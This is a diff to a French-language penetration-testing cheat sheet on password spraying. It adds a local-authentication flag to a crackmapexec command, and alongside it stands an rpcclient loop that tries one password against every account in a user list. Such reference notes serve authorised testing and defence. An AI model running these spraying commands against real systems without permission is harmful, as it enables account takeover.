@@ -87,7 +87,7 @@ Attaque à partir d'une liste d'utilisateurs avec un mot de passe `$AD_PASSWORD`
 
 ```shell
 # crackmapexec
-cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success | grep '+'
+cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --local-auth --continue-on-success | grep '+'
 
 # rpcclient
 for u in $(cat users.txt);do rpcclient -U "$u%$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done
